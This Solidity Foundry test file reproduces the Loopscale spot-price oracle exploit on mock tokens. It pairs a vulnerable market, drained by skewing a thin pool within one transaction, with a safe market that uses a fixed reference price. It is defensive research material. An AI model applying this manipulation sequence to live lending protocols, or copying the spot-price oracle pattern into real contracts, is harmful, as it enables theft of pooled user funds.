// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, SpotPool} from "../src/loopscale-oracle/SpotPool.sol";
import {
    VulnerableCollateralMarket,
    SafeCollateralMarket
} from "../src/loopscale-oracle/CollateralMarket.sol";

/// PoC for Loopscale's single-spot-price oracle exploit (2025-04-26, $5.8M).
///   forge test --match-contract LoopscaleOracle -vvv
///
/// EVM model. Invariant that SHOULD hold (master-checklist SC03): a reported collateral
/// price cannot be moved materially within a single transaction. The attack breaks it:
/// the market reads a thin pool's instantaneous spot price, so the attacker skews the
/// pool and borrows against wildly inflated collateral in the same tx.
///
/// See docs/exploits/loopscale-oracle-2025-04.md
contract LoopscaleOracleTest is Test {
    MockERC20 ptToken; // collateral
    MockERC20 usdc;
    SpotPool pool;

    address attacker = makeAddr("attacker");

    uint256 constant POOL_BASE = 1_000e18; // thin pool
    uint256 constant POOL_QUOTE = 1_000e18; // spot price = $1
    uint256 constant RESERVE = 100_000e18; // market USDC reserve
    uint256 constant DEPOSIT = 100e18; // collateral attacker pledges
    uint256 constant MANIP = 9_000e18; // USDC spent skewing the pool

    function setUp() public {
        ptToken = new MockERC20();
        usdc = new MockERC20();
        pool = new SpotPool(IERC20(address(ptToken)), IERC20(address(usdc)), POOL_BASE, POOL_QUOTE);
        ptToken.mint(address(pool), POOL_BASE);
        usdc.mint(address(pool), POOL_QUOTE);

        // Attacker funds: collateral to pledge + USDC to manipulate with.
        ptToken.mint(attacker, DEPOSIT);
        usdc.mint(attacker, MANIP);
    }

    function test_vulnerableMarket_spotPriceManipulated() public {
        VulnerableCollateralMarket market =
            new VulnerableCollateralMarket(IERC20(address(ptToken)), IERC20(address(usdc)), pool);
        usdc.mint(address(market), RESERVE);

        // Honest borrow at $1 would be DEPOSIT * 1 * 90% = 90 USDC.
        uint256 honestBorrow = (DEPOSIT * 1e18 / 1e18) * 9000 / 10000;

        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        pool.buyBase(MANIP); // spike the spot price within the tx
        ptToken.approve(address(market), type(uint256).max);
        uint256 before = usdc.balanceOf(attacker);
        market.borrow(DEPOSIT); // priced at the manipulated spot
        uint256 borrowed = usdc.balanceOf(attacker) - before;
        vm.stopPrank();

        console2.log("manipulated spot price ($):", pool.spotPrice() / 1e18);
        console2.log("borrowed vs honest (USDC):", borrowed / 1e18, honestBorrow / 1e18);
        assertGt(borrowed, honestBorrow * 10, "borrow inflated >10x by spot manipulation");
    }

    function test_safeMarket_resistsManipulation() public {
        // Reference price settled at the true $1 by a TWAP/aggregator.
        SafeCollateralMarket market =
            new SafeCollateralMarket(IERC20(address(ptToken)), IERC20(address(usdc)), 1e18);
        usdc.mint(address(market), RESERVE);

        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        pool.buyBase(MANIP); // same skew...
        ptToken.approve(address(market), type(uint256).max);
        uint256 before = usdc.balanceOf(attacker);
        market.borrow(DEPOSIT);
        uint256 borrowed = usdc.balanceOf(attacker) - before;
        vm.stopPrank();

        // ...but the price is immune, so borrow stays at the honest ~90 USDC — far less
        // than the MANIP the attacker burned skewing the pool. The attack loses money.
        assertEq(borrowed, DEPOSIT * 9000 / 10000, "borrow bounded by reference price");
        assertLt(borrowed, MANIP, "attack is unprofitable");
    }
}
